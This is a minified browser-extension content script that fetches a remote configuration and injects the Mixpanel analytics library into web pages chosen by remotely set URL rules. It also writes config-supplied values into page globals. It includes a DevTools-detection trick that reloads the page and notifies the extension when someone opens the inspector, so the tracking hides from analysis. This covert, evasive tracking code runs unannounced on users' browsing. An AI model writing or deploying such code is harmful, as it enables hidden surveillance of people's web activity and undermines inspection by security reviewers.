chrome.runtime.sendMessage({action:"getConfig"},d=>{try{if(d&&!d.extendedAnalytics)return;if(d&&d.optouted)return;if(d&&d.envDetected)return;if(d&&d.checkPattern){var e=new RegExp(d.checkPattern,"i");if(e.test(location.href)){var f=function(){var a=/./;return a.toString=function(){this.opened=!0},console.log("%c",a),a.opened?(chrome.runtime.sendMessage({action:"opot"}),void location.reload()):void setTimeout(f,1e3)};f()}}if(d&&d.ruleAllow){var g=new RegExp(d.ruleAllow[0],d.ruleAllow[1]);if(g.test(location.href));else return}if(d&&d.ruleDeny){var g=new RegExp(d.ruleDeny[0],d.ruleDeny[1]);if(g.test(location.href))return}(function(){(function(f,m){if(!m.__SV){var a=window;try{var e,n,o,p=a.location,j=p.hash;e=function(c,a){return(n=c.match(RegExp(a+"=([^&]*)")))?n[1]:null},j&&e(j,"state")&&(o=JSON.parse(decodeURIComponent(e(j,"state"))),"mpeditor"===o.action&&(a.sessionStorage.setItem("_mpcehash",j),history.replaceState(o.desiredHash||"",f.title,p.pathname+p.search)))}catch(a){}var g,q;if(window.mixpanel=m,d&&d.pp)for(var r in d.pp)window[r]=d.pp[r];m._i=[],m.init=function(a,b,c){function h(d,e){var f=e.split(".");2==f.length&&(d=d[f[0]],e=f[1]),d[e]=function(){d.push([e].concat(Array.prototype.slice.call(arguments,0)))}}var e=m;for("undefined"==typeof c?c="mixpanel":e=m[c]=[],e.people=e.people||[],e.toString=function(d){var b="mixpanel";return"mixpanel"!==c&&(b+="."+c),d||(b+=" (stub)"),b},e.people.toString=function(){return e.toString(1)+".people (stub)"},g=["disable","time_event","track","track_pageview","track_links","track_forms","register","register_once","alias","unregister","identify","name_tag","set_config","reset","people.set","people.set_once","people.unset","people.increment","people.append","people.union","people.track_charge","people.clear_charges","people.delete_user"],q=0;q<g.length;q++)h(e,g[q]);m._i.push([a,b,c])},m.__SV=1.2,a=f.createElement("script"),a.type="text/javascript",a.async=!0,a.src="undefined"==typeof MIXPANEL_CUSTOM_LIB_URL?"file:"===f.location.protocol&&"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js".match(/^\/\//)?"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js":"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js":MIXPANEL_CUSTOM_LIB_URL,e=f.getElementsByTagName("body")[0],e.appendChild(a)}})(document,window.mixpanel||[]),mixpanel.init(d&&d.mixpanelId?d.mixpanelId:null)})()}catch(a){}});